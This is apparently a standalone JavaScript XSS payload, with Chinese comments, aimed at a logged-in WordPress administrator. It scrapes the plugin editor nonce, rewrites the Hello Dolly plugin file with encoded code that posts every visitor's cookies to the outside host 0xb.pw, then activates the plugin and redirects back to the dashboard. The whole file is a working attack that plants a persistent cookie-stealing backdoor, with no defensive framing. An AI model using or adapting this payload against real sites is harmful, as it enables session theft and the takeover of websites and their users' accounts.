// 写入后门
url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '%3C%3Fphp%0A%2f%2a%0APlugin%20Name%3A%20Hello%20Dolly%0AVersion%3A%201.6%0A%2a%2f%0A%3F%3E%0A%3Cscript%3E%0Avar%20d%20%3D%20new%20XMLHttpRequest%28%29%3B%20%0Ad.open%28%27POST%27%2C%20%27http%3A%2f%2f0xb.pw%27%2C%20true%29%3B%20%0Ad.setRequestHeader%28%22Content-type%22%2C%22application%2fx-www-form-urlencoded%22%29%3B%0Ad.send%28%27cookie%3D%3C%3Fphp%20echo%20urlencode%28implode%28%27%23%27%2C%20%24_COOKIE%29%29%3F%3E%27%29%3B%0A%3C%2fscript%3E';

a = new XMLHttpRequest();
a.open('GET', url+p+q, 0);
a.send();

ss = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
'&newcontent=' + s + '&action=update&file=hello.php';

b = new XMLHttpRequest();
b.open('POST', url+p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send(ss);

// 开启插件
b.onreadystatechange = function(){
	if (this.readyState == 4) {
		// 解开启插件的请求回来
		c = new XMLHttpRequest();
		c.open('GET', url+'wp-admin/plugins.php', 0);
		c.send();

		sss = /(data-plugin="hello.php)[\w\s"\'<>=\-选择你好多莉\/[\].?&;]+/.exec(c.responseText);
		sss = /plugins.php([\w.?=&;]+)/.exec(sss)[0];
		sss = sss.replace(/&amp;/gi, '&')
		
		// 开启插件
		d = new XMLHttpRequest();
		d.open('GET', url+'wp-admin/'+sss, 0);
		d.send();

		// 跳回首页
		setTimeout('location.href='+url+'wp-admin/',2000);
   }
}
